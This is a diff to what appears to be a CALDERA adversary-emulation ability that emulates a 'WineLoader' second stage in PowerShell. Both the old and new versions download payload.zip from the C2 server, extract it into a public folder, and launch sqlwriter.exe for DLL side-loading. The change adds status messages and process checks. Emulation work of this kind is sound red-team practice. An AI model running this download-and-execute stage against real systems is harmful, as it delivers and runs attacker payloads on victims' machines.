@@ -11,40 +11,51 @@
           $ErrorActionPreference = "Stop";
           $workDir = "C:\Users\Public\Music\Work";
           $zipPath = "$workDir\data.zip";
-
-          # 1. Create working directory
-          if (!(Test-Path $workDir)) { 
-              New-Item -ItemType Directory -Path $workDir -Force | Out-Null 
-          };
-
           try {
-              # 2. Download payload via CALDERA API
-              # Using the /file/download endpoint with a file header
-              # instead of a direct URL
+              Write-Host "[*] Start Stage 2 execution";
+              $oldProc = Get-Process -Name "sqlwriter" -ErrorAction SilentlyContinue;
+              if ($oldProc) {
+                  Write-Host "[!] Found running sqlwriter.exe. Terminating...";
+                  Stop-Process -Name "sqlwriter" -Force;
+                  Start-Sleep -Seconds 1;
+              };
+              if (-not (Test-Path $workDir)) {
+                  New-Item -ItemType Directory -Path $workDir -Force | Out-Null;
+                  Write-Host "[+] Created working directory: $workDir";
+              } else {
+                  Write-Host "[*] Working directory already exists: $workDir";
+              };
+              Write-Host "[*] Downloading payload.zip...";
               $headers = @{"file"="payload.zip"};
               Invoke-WebRequest -Uri "#{server}/file/download" -Headers $headers -OutFile $zipPath -UseBasicParsing;
-
-              # 3. Verify and extract the payload
-              if (Test-Path $zipPath) {
-                  Expand-Archive -Path $zipPath -DestinationPath $workDir -Force;
-                  
-                  # 4. Execute payload (DLL side-loading)
-                  if (Test-Path "$workDir\sqlwriter.exe") {
-                      Set-Location $workDir;
-                      Start-Process ".\sqlwriter.exe";
-                      
-                      # Use a valid event ID to avoid eventcreate errors
-                      eventcreate /T INFORMATION /ID 999 /L APPLICATION /SO "WineLoader" /D "WineLoader Stage2 executed" | Out-Null;
-                      
-                      # This output is captured by the CALDERA parser
-                      Write-Output "stage2_executed";
-                  } else {
-                      Write-Error "sqlwriter.exe not found in ZIP";
-                      exit 1;
-                  }
-              }
+              if (-not (Test-Path $zipPath)) { throw "Payload download failed" };
+              Write-Host "[+] Zip downloaded: $zipPath";
+              Write-Host "[*] Extracting payload...";
+              Expand-Archive -Path $zipPath -DestinationPath $workDir -Force;
+              Write-Host "[+] Unzipped to: $workDir";
+              Write-Host "[*] Directory content:";
+              Get-ChildItem -Path $workDir | Select-Object Name | Out-String | Write-Host;
+              $exePath = "$workDir\sqlwriter.exe";
+              if (Test-Path $exePath) {
+                  Set-Location $workDir;
+                  Write-Host "[+] Running: $exePath";
+                  $p = Start-Process ".\sqlwriter.exe" -PassThru;
+                  if ($p) {
+                      Write-Host "[+] Process started. PID: $($p.Id)";
+                      Start-Sleep -Seconds 2;
+                      if ($p.HasExited) {
+                          Write-Host "[!] Process exited quickly. Code: $($p.ExitCode)";
+                      };
+                  };
+                  eventcreate /T INFORMATION /ID 999 /L APPLICATION /SO "WineLoader" /D "WineLoader Stage2 executed" | Out-Null;
+                  Write-Host "[+] Event log entry created";
+                  Write-Output "stage2_executed";
+              } else {
+                  throw "sqlwriter.exe not found in $workDir after extraction";
+              };
           } catch {
-              Write-Error $_.Exception.Message;
+              Write-Host "[!] Error encountered:";
+              Write-Error "Error: $($_.Exception.Message)";
               exit 1;
           }
         parsers:
